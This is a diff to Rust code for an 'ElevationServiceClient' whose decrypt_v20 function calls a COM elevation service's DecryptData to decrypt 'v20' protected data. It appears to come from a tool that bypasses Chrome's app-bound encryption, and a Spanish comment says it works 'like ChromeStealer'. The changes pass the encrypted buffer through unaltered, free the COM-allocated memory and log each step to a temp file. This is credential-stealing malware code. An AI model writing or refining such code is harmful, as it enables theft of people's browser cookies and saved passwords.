@@ -121,6 +121,8 @@ impl ElevationServiceClient {
     pub fn decrypt_v20(&self, encrypted_data: &[u8]) -> Result<Vec<u8>, String> {
         use std::fs::OpenOptions;
         use std::io::Write;
+    use winapi::um::combaseapi::CoTaskMemFree;
+    use std::os::raw::c_void;
         let temp_dir = std::env::temp_dir();
         let debug_path = temp_dir.join("elevation_service_debug.txt");
         let mut debug = OpenOptions::new()
@@ -130,6 +132,8 @@ impl ElevationServiceClient {
             .unwrap();
 
         writeln!(debug, "[decrypt_v20] Called with {} bytes", encrypted_data.len()).ok();
+        // Enviar el buffer tal cual, sin prefijos ni manipulación (como ChromeStealer)
+        let payload = encrypted_data;
         unsafe {
             let mut decrypted_ptr: *mut u8 = ptr::null_mut();
             let mut decrypted_size: u32 = 0;
@@ -137,8 +141,8 @@ impl ElevationServiceClient {
             writeln!(debug, "[decrypt_v20] Calling DecryptData...").ok();
             let hr = ((*(*self.elevator).lpVtbl).DecryptData)(
                 self.elevator,
-                encrypted_data.as_ptr(),
-                encrypted_data.len() as u32,
+                payload.as_ptr(),
+                payload.len() as u32,
                 &mut decrypted_ptr as *mut *mut u8,
                 &mut decrypted_size as *mut u32,
             );
@@ -156,6 +160,8 @@ impl ElevationServiceClient {
 
             writeln!(debug, "[decrypt_v20] DecryptData SUCCESS, {} bytes", decrypted_size).ok();
             let decrypted_data = std::slice::from_raw_parts(decrypted_ptr, decrypted_size as usize).to_vec();
+            // Liberar memoria asignada por COM
+            CoTaskMemFree(decrypted_ptr as *mut c_void);
             Ok(decrypted_data)
         }
     }
